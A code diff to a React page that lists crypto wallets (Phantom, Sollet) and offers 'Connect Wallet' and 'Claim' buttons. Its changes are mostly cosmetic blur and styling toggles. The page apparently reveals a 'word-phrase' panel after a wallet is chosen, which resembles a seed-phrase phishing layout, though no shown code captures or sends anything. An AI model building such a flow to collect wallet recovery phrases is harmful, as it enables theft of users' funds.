@@ -28,7 +28,7 @@ export default function Home() {
     },
     {
       name: "Phantom",
-      image: "Phantom-Wallet.png",
+      image: "Phantom-wallet.png",
     },
     {
       name: "Sollet",
@@ -70,6 +70,7 @@ export default function Home() {
       .forEach((x) => x.classList.toggle("hidden"));
     // Blur Claim button
     document.getElementById("claimButton").classList.toggle("blur-lg");
+    document.getElementById("connectWallet").classList.toggle("blur-lg");
   };
   const showPhrase = (decide) => {
     if (decide == "all") {
@@ -77,13 +78,14 @@ export default function Home() {
       document
         .querySelectorAll(".modal")
         .forEach((x) => x.classList.add("hidden"));
-          document.getElementById("claimButton").classList.remove("blur-lg");
-
+      document.getElementById("claimButton").classList.remove("blur-lg");
+      document.getElementById("connectWallet").classList.remove("blur-lg");
       return;
     }
     document.querySelector(".word-phrase").classList.remove("hidden");
     document.getElementById("selectWallet").classList.add("hidden");
     document.getElementById("claimButton").classList.add("blur-lg");
+    document.getElementById("connectWallet").classList.add("blur-lg");
   };
   return (
     <div className="bg-black">
@@ -106,9 +108,10 @@ export default function Home() {
           </div>
           <div className="flex justify-end">
             <ul className="flex gap-5 items-center">
-              <li>Home</li>
+              <li onClick={() => console.log("Big Gee")}>Home</li>
               <li
-                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
+                id="connectWallet"
+                className="bg-[#17fb9b] relative z-10 cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
                 onClick={showModal}
               >
                 Connect Wallet
